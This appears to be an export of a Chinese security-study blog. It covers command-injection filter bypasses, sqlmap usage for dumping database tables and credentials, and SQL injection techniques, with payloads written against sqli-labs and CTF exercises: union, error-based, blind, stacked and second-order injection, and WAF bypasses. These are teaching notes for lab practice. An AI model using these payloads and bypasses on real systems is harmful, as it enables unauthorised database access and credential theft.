#列出当前目录下的文件以及子目录所有文件</span><br></pre></td></tr></table></figure><ul><li>过滤空格</li></ul><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">cat&lt;flag  #重定向符</span><br><span class="line"><span class="meta prompt_">cat$</span><span class="language-bash">&#123;IFS&#125;flag || <span class="built_in">cat</span>$IFS<span class="variable">$9flag</span> <span class="comment">#全局变量</span></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash"><span class="variable">$IFS</span>在linux下表示分隔符，但是如果单纯的<span class="built_in">cat</span><span class="variable">$IFS2</span>,bash解释器会把整个IFS2当做变量名，所以导致输不出来结果</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">然而如果加一个&#123;&#125;就固定了变量名，同理在后面加个$可以起到截断的作用，</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">为什么要用<span class="variable">$9</span>呢，因为<span class="variable">$9</span>是当前系统shell进程的第九个参数的持有者，它始终为空字符串</span></span><br></pre></td></tr></table></figure><ul><li>过滤目录分隔符</li></ul><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">采用多管道命令绕过</span></span><br><span class="line">127.0.0.1||cd flag_is_here;cat flag_262431433226364.php</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">%</span><span class="language-bash">0a      <span class="comment">#换行符</span></span></span><br><span class="line"><span class="meta prompt_">%</span><span class="language-bash">0d      <span class="comment">#回车符号</span></span></span><br><span class="line">用?&gt;代替 ;</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">在php中可以用?&gt;来代替最后的一个; ，因为php遇到定界符关闭标签会自动在末尾加上一个分号</span></span><br></pre></td></tr></table></figure><p>其他绕过：<a href="https://zhuanlan.zhihu.com/p/391439312">命令执行(RCE)面对各种过滤，骚姿势绕过总结 </a></p>]]></content>
      
      
      <categories>
          
          <category> 网络安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>sqlmap</title>
      <link href="/post/e5da2ca1.html"/>
      <url>/post/e5da2ca1.html</url>
      
        <content type="html"><![CDATA[<span id="more"></span><h1 id="sqlmap简介"><a href="#sqlmap简介" class="headerlink" title="sqlmap简介"></a>sqlmap简介</h1><p>sqlmap是一个自动化的SQL注入工具，其主要功能是扫描，发现并利用给定的URL进行SQL注入。</p><h1 id="用于数据库注入"><a href="#用于数据库注入" class="headerlink" title="用于数据库注入"></a>用于数据库注入</h1><ol><li>猜解是否能注入</li></ol><blockquote><p>python sqlmap.py -u “url”</p></blockquote><ol start="2"><li>猜解库</li></ol><blockquote><p>python sqlmap.py -u “url” –dbs</p></blockquote><ol start="3"><li>猜解表</li></ol><blockquote><p>python sqlmap.py -u “url” –tables</p></blockquote><ol start="4"><li>根据猜解的表进行猜解表的字段(假如通过2得到了admin这个表)</li></ol><blockquote><p>python sqlmap.py -u “url” –columns -T admin</p></blockquote><ol start="5"><li>根据字段猜解内容(假如通过3得到字段为username和password)</li></ol><blockquote><p>python sqlmap.py -u “url” –dump -T admin -C “username,password”</p></blockquote><h1 id="用于cookie注入"><a href="#用于cookie注入" class="headerlink" title="用于cookie注入"></a>用于cookie注入</h1><ol><li>cookie注入，猜解表</li></ol><blockquote><p>python sqlmap.py -u “url” –cookie “cookie” –table –level 2</p></blockquote><ol start="2"><li>猜解字段，(通过1的表猜解字段，假如表为admin)</li></ol><blockquote><p>python sqlmap.py -u “url” –cookie “cookie” –columns -T admin –level 2</p></blockquote><ol start="3"><li>猜解内容</li></ol><blockquote><p>python sqlmap.py -u “url” –cookie “cookie” –dump -T admin -C “username,password” –level 2</p></blockquote><h1 id="post登录框注入"><a href="#post登录框注入" class="headerlink" title="post登录框注入"></a>post登录框注入</h1><ol><li>浏览器打开目标地址</li><li>burp抓包，拦截请求</li><li>点击提交，burp会拦截post请求</li><li>复制post请求头为post.txt，并放到sqlmap目录下</li><li>运行sqlmap</li></ol><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">step1：sqlmap <span class="operator">-</span>r [&quot;请求头文本&quot;]  <span class="operator">/</span><span class="operator">/</span>测试是否存在注入</span><br><span class="line">step2：sqlmap <span class="operator">-</span>r [&quot;请求头文本&quot;] <span class="comment">--current-db //查询当前数据库</span></span><br><span class="line">step3：sqlmap <span class="operator">-</span>r [&quot;请求头文本&quot;] <span class="operator">-</span>D [&quot;数据库名&quot;] <span class="comment">--tables //查询当前数据库的所有表</span></span><br><span class="line">step4：sqlmap <span class="operator">-</span>r [&quot;请求头文本&quot;] <span class="operator">-</span>D [&quot;数据库名&quot;] <span class="operator">-</span>T [&quot;表名&quot;] <span class="comment">--columns //查询指定库指定表的所有字段</span></span><br><span class="line">step5：sqlmap <span class="operator">-</span>r [&quot;请求头文本&quot;] <span class="operator">-</span>D [&quot;数据库名&quot;] <span class="operator">-</span>T [&quot;表名&quot;] <span class="operator">-</span>C [&quot;字段名&quot;] <span class="comment">--dump //打印出指定库指定表指定字段的所有字段内容</span></span><br></pre></td></tr></table></figure><h1 id="常见参数使用"><a href="#常见参数使用" class="headerlink" title="常见参数使用"></a>常见参数使用</h1><ul><li>设置目标URL：</li></ul><blockquote><p>参数：-u    每次只能扫描一个url<br>格式：sqlmap -u “url”</p><p>参数：-m    从文本中获取多个目标扫描，但是每次只能有一个url<br>格式：sqlmap -m 1.txt、</p><p>参数：-r    从文件中加载HTTP请求，这样的话，就不需要再去设定coolie，POST数据等值…..<br>格式：sqlmap -r 1.txt</p></blockquote><ul><li>设置回显等级：</li></ul><blockquote><p>参数：-v<br>0、只显示python错误以及严重的信息。<br>1、同时显示基本信息和警告信息。（默认等级）<br>2、同时显示debug信息。<br>3、同时显示注入的payload。<br>4、同时显示HTTP请求。<br>5、同时显示HTTP响应头。<br>6、同时显示HTTP响应页。</p></blockquote><ul><li>设定探测等级：</li></ul><blockquote><p>参数：–level<br>默认为1<br>level&gt;=2的时候就会测试HTTP Cookie<br>level&gt;=3的时候就会测试HTTP User-Agent/Referer头<br>level=5的时候会测试HTTP Host</p></blockquote><h1 id="参数介绍"><a href="#参数介绍" class="headerlink" title="参数介绍"></a>参数介绍</h1><ul><li>options类：</li></ul><blockquote><p>sqlmap –version    查看sqlmap版本信息.</p><p>-h    查看功能参数(常用的)</p><p>-hh　查看所有的参数 (如果有中文包 就最好了)</p><p>-v　显示更详细的信息 一共7级, 从0-6.默认为1, 数值越大,信息显示越详细.</p></blockquote><ul><li>Target(指定目标):</li></ul><blockquote><p>-d　直接连接数据库侦听端口,类似于把自己当一个客户端来连接.</p><p>-u    指定url扫描,但url必须存在查询参数. 例: xxx.php?id=1 </p><p>-l    指定logfile文件进行扫描,可以结合burp 把访问的记录保存成一个log文件, sqlmap可以直接加载burp保存到log文件进行扫描</p><p>-x    以xml的形式提交一个站点地图给sqlmap(表示不理解..)</p><p>-m    如果有多个url地址,可以把多个url保存成一个文本文件 -m可以加载文本文件逐个扫描</p><p>-r    把http的请求头,body保存成一个文件 统一提交给sqlmap,sqlmap会读取内容进行拼接请求体</p><p>-g    利用谷歌搜索引擎搭配正则来过滤你想要的</p><p>-c    加载配置文件,配置文件可以指定扫描目标,扫描方式,扫描内容等等.加载了配置文件sqlmap就会根据文件内容进行特定的扫描</p></blockquote><ul><li>Request类参数</li></ul><blockquote><p>–data    提交的时候要携带的参数（get，post通用，最简单的post请求方式）</p><p>–users     获取数据库用户</p><p>–dbs    获取所有数据库</p><p>–cookie    设置cookie头</p><p>–user-agent    指定user-agent（防止对方服务器侦测到）</p><p>–random-agent    随机agent</p><p>–host    指定host头</p><p>–level    安全级别 (1-5, &gt;=3,检测anent,&gt;=5,检测host头)</p><p>–referer    指定referer头(level &gt;=3才检测)</p><p>–headers    指定额外的headers请求头(多个必须使用换\n,首字母必须大写)</p><p>–method　指定请求方式, 默认为get,get请求不成功尝试post　　　</p><p>–proxy　指定代理 </p><p>–proxy-cred    指定代理的账号密码(代理需要账号密码的前提下)</p><p>–delay　每次请求的延迟时间,单位秒,默认无延迟.</p><p>–timeout　请求超时时间,默认30秒.</p><p>–retries　连接超时重试次数 ,默认3次</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> 网络安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 工具 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>sql注入</title>
      <link href="/post/530fceb2.html"/>
      <url>/post/530fceb2.html</url>
      
        <content type="html"><![CDATA[<span id="more"></span><h1 id="什么是SQL注入"><a href="#什么是SQL注入" class="headerlink" title="什么是SQL注入"></a>什么是SQL注入</h1><blockquote><p>SQL 注入就是指 web应用程序对用户输入的数据合法性没有过滤或者是判断，前端传入的参数是攻击者可以控制，并且参数带入数据库的查询，攻击者可以通过构造恶意的 sql语句来实现 对数据库的任意操作。</p></blockquote><h1 id="SQL注入攻击思路"><a href="#SQL注入攻击思路" class="headerlink" title="SQL注入攻击思路"></a>SQL注入攻击思路</h1><blockquote><ol><li>判断是否存在注入</li><li>判断注入类型</li><li>猜解语句中的字段数</li><li>判断回显位置</li><li>爆数据库名</li><li>爆表名</li><li>爆字段名</li><li>查找内容</li></ol></blockquote><h1 id="判断是否存在SQL注入"><a href="#判断是否存在SQL注入" class="headerlink" title="判断是否存在SQL注入"></a>判断是否存在SQL注入</h1><blockquote><p>最为经典的单引号判断法：<br>在参数后面加上单引号,比如: <code>http://xxx/abc.php?id=1&#39;</code> 如果页面返回错误，则存在SQL注入。<br>原因是无论字符型还是整型都会因为单引号个数不匹配而报错。</p></blockquote><h1 id="判断SQL注入类型"><a href="#判断SQL注入类型" class="headerlink" title="判断SQL注入类型"></a>判断SQL注入类型</h1><p>类型分为两种：数字型和字符型</p><ul><li>数字型判断：<br>可以使用经典的 and 1=1 和 and 1=2 来判断：</li></ul><blockquote><p>url中输入？id=1 and 1=1 页面依旧正常运行，继续下一步<br>url中输入？id=1 and 1=2 页面运行错误，则说明此 Sql 注入为数字型注入。</p></blockquote><ul><li>字符型判断：<br>可以使用 and ‘1’=’1 和 and ‘1’=’2来判断：</li></ul><blockquote><p>url中输入1’ and ‘1’ = ‘1,页面运行正常，继续进行下一步。<br>url中继续输入1’ and ‘1’ = ‘2,页面运行错误，则说明此 Sql 注入为字符型注入。</p></blockquote><h1 id="常见的注入方式"><a href="#常见的注入方式" class="headerlink" title="常见的注入方式"></a>常见的注入方式</h1><blockquote><p>联合注入</p><p>布尔盲注</p><p>时间盲注</p><p>宽字节注入</p><p>报错注入</p><p>堆叠注入</p><p>二次注入</p><p>……</p></blockquote><h2 id="联合注入"><a href="#联合注入" class="headerlink" title="联合注入"></a>联合注入</h2><p>注入一般流程：</p><blockquote><ol><li>判断注入点</li><li>判断字段数</li><li>判断回显位置</li><li>爆破库名</li><li>爆破表名</li><li>爆破字段名</li><li>爆破字段值</li></ol></blockquote><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">以<span class="keyword">sql</span><span class="operator">-</span>libs<span class="operator">/</span>Less<span class="number">-1</span>为例</span><br><span class="line">(<span class="number">1</span>)判断注入点</span><br><span class="line">payload：http:<span class="operator">/</span><span class="operator">/</span>localhost<span class="operator">/</span>www.sql.com<span class="operator">/</span>Less<span class="number">-1</span><span class="operator">/</span>?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; and 1=1 --+</span></span><br><span class="line"><span class="string">payload： http://localhost/www.sql.com/Less-1/?id=1&#x27;</span> <span class="keyword">and</span> <span class="number">1</span><span class="operator">=</span><span class="number">2</span> <span class="comment">--+</span></span><br><span class="line">根据页面回显不同，判断id参数存在<span class="keyword">sql</span>注入</span><br><span class="line">(<span class="number">2</span>)判断字段数 <span class="keyword">order</span> <span class="keyword">by</span></span><br><span class="line">payload：http:<span class="operator">/</span><span class="operator">/</span>localhost<span class="operator">/</span>www.sql.com<span class="operator">/</span>Less<span class="number">-1</span><span class="operator">/</span>?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; order by x --+</span></span><br><span class="line"><span class="string">发现x=3时有回显，x=4时无回显，判断出存在三列</span></span><br><span class="line"><span class="string">(3)判断回显位置 union select需将参数的数据值设为不存在</span></span><br><span class="line"><span class="string">payload：http://localhost/sqli-labs/Less-1/?id=-1&#x27;</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span> <span class="comment">--+ </span></span><br><span class="line">判断出回显位置为<span class="number">2</span>，<span class="number">3</span></span><br><span class="line">(<span class="number">4</span>)爆破库名 在回显位置替换参数即可</span><br><span class="line">payload：http:<span class="operator">/</span><span class="operator">/</span>localhost<span class="operator">/</span>sqli<span class="operator">-</span>labs<span class="operator">/</span>Less<span class="number">-1</span><span class="operator">/</span>?id<span class="operator">=</span><span class="number">-1</span><span class="string">&#x27; union select 1,database(),3 --+ </span></span><br><span class="line"><span class="string">(5)爆破表名 </span></span><br><span class="line"><span class="string">payload：http://localhost/sqli-labs/Less-1/?id=-1&#x27;</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,(<span class="keyword">select</span> group_concat(table_name) <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema<span class="operator">=</span>database()),<span class="number">3</span> <span class="comment">--+ </span></span><br><span class="line">(<span class="number">6</span>)爆破字段名</span><br><span class="line">payload：http:<span class="operator">/</span><span class="operator">/</span>localhost<span class="operator">/</span>sqli<span class="operator">-</span>labs<span class="operator">/</span>Less<span class="number">-1</span><span class="operator">/</span>?id<span class="operator">=</span><span class="number">-1</span><span class="string">&#x27; union select 1,(select group_concat(column_name) from information_schema.columns where table_name=&#x27;</span>users<span class="string">&#x27;),3 --+ </span></span><br><span class="line"><span class="string">(7)爆破字段值</span></span><br><span class="line"><span class="string">payload：http://localhost/sqli-labs/Less-1/?id=-1&#x27;</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,(<span class="keyword">select</span> group_concat(username,<span class="number">0x3a</span>,password) <span class="keyword">from</span> users),<span class="number">3</span> <span class="comment">--+</span></span><br></pre></td></tr></table></figure><h2 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h2><p>应用场景：查询不回显内容，会打印错误信息</p><blockquote><p>常用函数：floor(),updatexml(),extractvalue()</p></blockquote><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">以updatexml()为例</span><br><span class="line">(<span class="number">1</span>)爆表 修改 limit <span class="number">0</span>,<span class="number">1</span> 参数 依次爆出所有表名</span><br><span class="line">payload：http:<span class="operator">/</span><span class="operator">/</span>localhost<span class="operator">/</span>sqli<span class="operator">-</span>labs<span class="operator">/</span>Less<span class="number">-1</span><span class="operator">/</span>?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; and updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()),0x7e),1) --+</span></span><br><span class="line"><span class="string">(2)爆字段名</span></span><br><span class="line"><span class="string">payload：http://localhost/sqli-labs/Less-1/?id=1&#x27;</span> <span class="keyword">and</span> updatexml(<span class="number">1</span>,concat(<span class="number">0x7e</span>,(<span class="keyword">select</span> column_name <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_name<span class="operator">=</span><span class="string">&#x27;users&#x27;</span> limit <span class="number">0</span>,<span class="number">1</span>),<span class="number">0x7e</span>),<span class="number">1</span>) <span class="comment">--+</span></span><br><span class="line">通过修改limit参数，获取所有字段名</span><br><span class="line">(<span class="number">3</span>)爆字段值</span><br><span class="line">payload：http:<span class="operator">/</span><span class="operator">/</span>localhost<span class="operator">/</span>sqli<span class="operator">-</span>labs<span class="operator">/</span>Less<span class="number">-1</span><span class="operator">/</span>?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; and updatexml(1,concat(0x7e,(select username from users limit 0,1),0x7e),1) --+</span></span><br><span class="line"><span class="string">通过修改limit参数，获取所有字段值</span></span><br><span class="line"><span class="string">(4)爆对应的密码</span></span><br><span class="line"><span class="string">payload：http://localhost/sqli-labs/Less-1/?id=1&#x27;</span> <span class="keyword">and</span> updatexml(<span class="number">1</span>,concat(<span class="number">0x7e</span>,(<span class="keyword">select</span> password <span class="keyword">from</span> users <span class="keyword">where</span> username <span class="operator">=</span> <span class="string">&#x27;Dumb&#x27;</span> limit <span class="number">0</span>,<span class="number">1</span>),<span class="number">0x7e</span>),<span class="number">1</span>) <span class="comment">--+</span></span><br><span class="line">通过修改limit参数，获取所有字段值</span><br></pre></td></tr></table></figure><h2 id="布尔盲注"><a href="#布尔盲注" class="headerlink" title="布尔盲注"></a>布尔盲注</h2><p>应用场景：</p><blockquote><p>代码存在sql注入漏洞，然而页面不会显数据，也不会显错误信息。只返回”right” 与wrong 这里我们可以通过构造语句，来判断数据库信息的正确性，在通过页面的“真”和“假”来识别我们的判断是否正确，这就是布尔盲注。</p></blockquote><p>常用函数：</p><blockquote><p>left()       left(database(),1)&gt;’s’    database()显示数据库名称，left(a,b)从左侧截取a的前b位。<br>regexp           select user() regexp ‘^r’  正则表达式用法 user()结果为root,regexp为匹配root的正则表达式<br>like         select users() like ‘’ro%’   与regexp类似，使用like进行匹配<br>substr函数   ascii() 函数    ascii(substr(select database()),1,1)=98 从1位置开始截取数据库名字的1个长度，ascii()将字符转化为ascii值。<br>ord()   mid()     mid(a,b,c)<br>ord(mid((select user()),1,1))=114<br>从位置b开始，截取a字符串的c位，ord()函数通ascii()，将字符转为ascii值。</p></blockquote><h2 id="时间盲注"><a href="#时间盲注" class="headerlink" title="时间盲注"></a>时间盲注</h2><p>时间盲注是什么？</p><blockquote><p>通过注入特定语句，根据对页面请求的物理反馈，来判断是否注入成功，如：在SQL语句中使用sleep()函数</p><p>看加载页面的时间来判断注入点</p><p>适用场景：没有回显，甚至连注入语句是否执行都无从得知</p></blockquote><p>常用函数：</p><blockquote><p>sleep() – 返回0 命令中断返回1<br>substr(a,b,c) – 从b为止开始截取字符串a的c长度<br>mid() – 与substr完全一致<br>count() – 计算总数<br>ascii() – 返回第一个字符的ASII码<br>ord() – 与ascii完全一致<br>length() – 返回字符串的长度<br>left() – 从左往右截取字符串<br>right() –从右往左截取字符串<br>if(condition,true,false)：condition为条件，条件为真返回true，条件为假返回false</p></blockquote><p>注入一般流程：</p><blockquote><p>先用length()获取数据库长度<br>用substr() and sleep() 来确定每一个字符，从而确定数据库</p></blockquote><h2 id="堆叠注入"><a href="#堆叠注入" class="headerlink" title="堆叠注入"></a>堆叠注入</h2><blockquote><p>原理介绍： 在SQL中，分号（;）是用来表示一条sql语句的结束。</p></blockquote><blockquote><p>联合注入也是将两条语句合并在一起，两者之间有什么区别么？<br>区别就在于union或者unionall执行的语句类型是有限的，可以用来执行查询语句，而堆叠注入可以执行的是任意的语句。 </p></blockquote><blockquote><p>局限性： 使用该注入，需要知道数据库的一些信息，例如表名，列名等。<br>并不是每种环境都可以使用。<br>oracle数据库不行，mysql、mssql‘postgresql可以。  </p></blockquote><blockquote><p>应用实例：已经爆破出管理员密码，但是是加密存储，且无法解密。可以使用堆叠注入，在该表中注入 </p></blockquote><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">举个栗子</span><br><span class="line">;<span class="keyword">select</span> if(length(database())<span class="operator">&gt;</span><span class="number">1</span>,sleep(<span class="number">3</span>),<span class="number">1</span>)</span><br><span class="line">;<span class="keyword">select</span> if(substr(database(),<span class="number">1</span>,<span class="number">1</span>)<span class="operator">=</span><span class="string">&#x27;r&#x27;</span>,sleep(<span class="number">3</span>),<span class="number">1</span>)</span><br></pre></td></tr></table></figure><h2 id="二次注入"><a href="#二次注入" class="headerlink" title="二次注入"></a>二次注入</h2><blockquote><p>原理 分为两步：<br>第一步：插入恶意数据<br>第一次进行数据库插入数据的时候，仅仅对其中的特殊字符进行转义，在写入数据库时还是保留用户输入的数据，但是该数据中包含恶意内容。 </p><p>第二步：引用恶意数据<br>在将数据存入到了数据库中之后，开发者就认为数据是可信的。在下一次需要进行查询的时候，直接从数据库中取出了恶意数据，没有进行进一步的检验和处理，这样就会造成SQL的二次注入。 </p></blockquote><blockquote><p>例如：<br>输入参数1’     参数经过转义函数变为1&#39;    参数进入数据库存储还原为1’<br>寻找另一处引用这个数据的操作<br>将1’从数据库中取出       取出后直接给变量并且带入SQL   SQL注入触发 实战   sql-lib 24 1.在创建用户界面 创建 admin’#  123 账号 2.登录  admin ‘#  123 账号 修改admin’#密码为  123456 3.发现 admin 密码变为123456</p></blockquote><blockquote><p>实战   sql-lib 24<br>1.在创建用户界面 创建 admin’#  123 账号<br>2.登录  admin ‘#  123 账号 修改admin’#密码为  123456<br>3.发现 admin 密码变为123456</p></blockquote><h1 id="SQL注入绕过"><a href="#SQL注入绕过" class="headerlink" title="SQL注入绕过"></a>SQL注入绕过</h1><h2 id="注入符号绕过"><a href="#注入符号绕过" class="headerlink" title="注入符号绕过"></a>注入符号绕过</h2><ul><li>常见的注释符号有</li></ul><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">-- 注释内容</span></span><br><span class="line"># 注释内容</span><br><span class="line"><span class="comment">/*注释内容*/</span></span><br><span class="line">;</span><br></pre></td></tr></table></figure><h2 id="大小写绕过"><a href="#大小写绕过" class="headerlink" title="大小写绕过"></a>大小写绕过</h2><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">举个例子</span><br><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> users <span class="keyword">where</span> id <span class="operator">=</span> <span class="number">-1</span> <span class="keyword">union</span> <span class="keyword">SelEcT</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span></span><br></pre></td></tr></table></figure><h2 id="内联注释绕过"><a href="#内联注释绕过" class="headerlink" title="内联注释绕过"></a>内联注释绕过</h2><ul><li>内联注释就是把一些特有的仅在MYSQL上的语句放在 <code>/*!...*/</code> 中，这样这些语句如果在其它数据库中是不会被执行，但在MYSQL中会执行。</li></ul><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">举个例子</span><br><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> users <span class="keyword">where</span> id <span class="operator">=</span> <span class="number">-1</span> <span class="keyword">union</span> <span class="comment">/*!select*/</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>;</span><br></pre></td></tr></table></figure><h2 id="双写关键字绕过"><a href="#双写关键字绕过" class="headerlink" title="双写关键字绕过"></a>双写关键字绕过</h2><ul><li>将关键字<code>select</code>等只使用<code>replace()</code>函数置换为空，这时候可以使用双写关键字绕过。例如<code>select</code>变成<code>seleselectct</code>，在经过<code>waf</code>的处理之后又变成<code>select</code>，达到绕过的要求。</li></ul><h2 id="十六进制绕过"><a href="#十六进制绕过" class="headerlink" title="十六进制绕过"></a>十六进制绕过</h2><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">举个例子</span><br><span class="line">test1等价于<span class="number">0x7465737431</span></span><br><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> users <span class="keyword">where</span> username <span class="operator">=</span> <span class="number">0x7465737431</span>;</span><br></pre></td></tr></table></figure><h2 id="空格过滤绕过"><a href="#空格过滤绕过" class="headerlink" title="空格过滤绕过"></a>空格过滤绕过</h2><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**/</span></span><br><span class="line">()</span><br><span class="line">回车(url编码中的<span class="operator">%</span><span class="number">0</span>a)</span><br><span class="line">`(tap键上面的按钮)</span><br><span class="line">tap</span><br><span class="line">两个空格</span><br></pre></td></tr></table></figure><h2 id="过滤or-and-xor-not-绕过"><a href="#过滤or-and-xor-not-绕过" class="headerlink" title="过滤or and xor not 绕过"></a>过滤or and xor not 绕过</h2><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">and</span> <span class="operator">=</span> <span class="operator">&amp;&amp;</span></span><br><span class="line"><span class="keyword">or</span> <span class="operator">=</span> <span class="operator">||</span></span><br><span class="line">xor <span class="operator">=</span> <span class="operator">|</span> # 异或</span><br><span class="line"><span class="keyword">not</span> <span class="operator">=</span> <span class="operator">!</span></span><br></pre></td></tr></table></figure><h2 id="过滤等号-绕过"><a href="#过滤等号-绕过" class="headerlink" title="过滤等号=绕过"></a>过滤等号=绕过</h2><ul><li>不加通配符的like执行的效果和=一致，所以可以用来绕过。<br>利用大小于号、!配合使用进行绕过</li></ul>]]></content>
      
      
      <categories>
          
          <category> 网络安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web安全 </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
